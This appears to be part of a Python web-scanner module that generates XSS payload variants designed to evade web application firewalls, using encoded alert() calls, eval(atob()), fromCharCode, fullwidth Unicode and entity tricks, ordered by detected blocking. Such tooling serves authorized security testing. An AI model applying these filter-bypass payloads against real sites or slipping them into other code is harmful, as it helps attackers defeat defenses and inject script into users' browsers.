def _entity_parens(payload: str) -> str | None:
    """Entity-encode JS parentheses; the HTML parser decodes them inside values."""
    if "(" not in payload and ")" not in payload:
        return None
    return payload.replace("(", "&#40;").replace(")", "&#41;")


def _unicode_forms(payload: str) -> str | None:
    """Replace break-out characters with fullwidth equivalents (NFKC bypass)."""
    if not any(ch in payload for ch in _UNICODE_MAP):
        return None
    out = "".join(_UNICODE_MAP.get(ch, ch) for ch in payload)
    return out if out != payload else None


def _json_escape(payload: str) -> str | None:
    """Escape the characters a JSON parser will unescape for us."""
    if not any(ch in payload for ch in _JSON_MAP):
        return None
    return "".join(_JSON_MAP.get(ch, ch) for ch in payload)


def _js_call(name: str, marker: str) -> str:
    """Build an evasion invocation of alert() for a concrete marker."""
    if name == "js-unicode":
        # Identifier escape: valid JS, invisible to a rule that matches "alert".
        return f"\\u0061lert('{marker}')"
    if name == "js-split":
        return f"window['al'+'ert']('{marker}')"
    if name == "js-top":
        return f"top['al'+'ert']('{marker}')"
    if name == "js-template":
        # Tagged template call: executes without ever using parentheses.
        return f"alert`{marker}`"
    if name == "js-b64":
        encoded = base64.b64encode(f"alert('{marker}')".encode()).decode()
        return f"eval(atob('{encoded}'))"
    if name == "js-fromcharcode":
        codes = ",".join(str(b) for b in f"alert('{marker}')".encode())
        return f"eval(String.fromCharCode({codes}))"
    if name == "js-constructor":
        return f"[].constructor.constructor(\"alert('{marker}')\")()"
    return f"alert('{marker}')"


def js_variants(marker: str) -> list[tuple[str, str]]:
    """Evasion JS bodies for *this* marker, ordered cheapest-first.

    Built with the real marker rather than a placeholder: the base64 and
    fromCharCode forms encode the marker itself, so a later textual
    substitution could not reach inside them.
    """
    return [
        ("waf-split", _js_call("js-split", marker)),
        ("waf-unicode", _js_call("js-unicode", marker)),
        ("waf-template", _js_call("js-template", marker)),
        ("waf-b64", _js_call("js-b64", marker)),
        ("waf-top", _js_call("js-top", marker)),
    ]


_MARKUP_ONLY = {"case", "comment-pad", "tab-space", "unclosed", "nested-tag",
                "space-slash", "newline-space"}


def markup_variants(payload: str, context: str,
                    strategies: tuple[str, ...] | list[str],
                    limit: int = 6,
                    order: tuple[str, ...] | list[str] | None = None) -> list[tuple[str, str]]:
    """Payload-level evasions for the given vendor, filtered by context.

    ``payload`` is the rendered payload (marker and JS already substituted).
    ``order`` overrides the static preference with an observed one (see
    AdaptiveEvasion); it can only reorder the strategies the vendor allows.
    Returns ``(strategy, payload)`` pairs, deduplicated and capped.
    """
    if not payload or limit <= 0:
        return []
    markup_ok = context in MARKUP_CONTEXTS
    allowed = set(strategies)
    if order is not None:
        ordered = [s for s in order if s in allowed]
        ordered += [s for s in STRATEGY_ORDER if s in allowed and s not in ordered]
    else:
        ordered = [s for s in STRATEGY_ORDER if s in allowed]
    ordered += [s for s in strategies if s not in ordered]
    out: list[tuple[str, str]] = []
    seen = {payload}
    available = dict(mutate(payload, limit=12))
    for strategy in ordered:
        if len(out) >= limit:
            break
        if strategy in _MARKUP_ONLY and not markup_ok:
            continue
        if strategy == "js-entity":
            candidate = _entity_parens(payload)
        elif strategy == "unicode":
            candidate = _unicode_forms(payload)
        elif strategy == "json-escape":
            # Only meaningful where a JSON parser does the decoding; sending it
            # at an HTML sink produces a literal backslash, so it is gated on the
            # reflection being inside a JSON value.
            if not context.startswith("json"):
                continue
            candidate = _json_escape(payload)
        else:
            candidate = available.get(strategy)
        if not candidate or candidate in seen:
            continue
        seen.add(candidate)
        out.append((strategy, candidate))
    return out


def evasion_budget(confidence: str, blocking: bool) -> int:
    """How many extra payload variants a detection justifies."""
    if blocking and confidence == "high":
        return 6
    if blocking:
        return 4
    if confidence == "high":
        return 3
    if confidence == "medium":
        return 2
    return 0
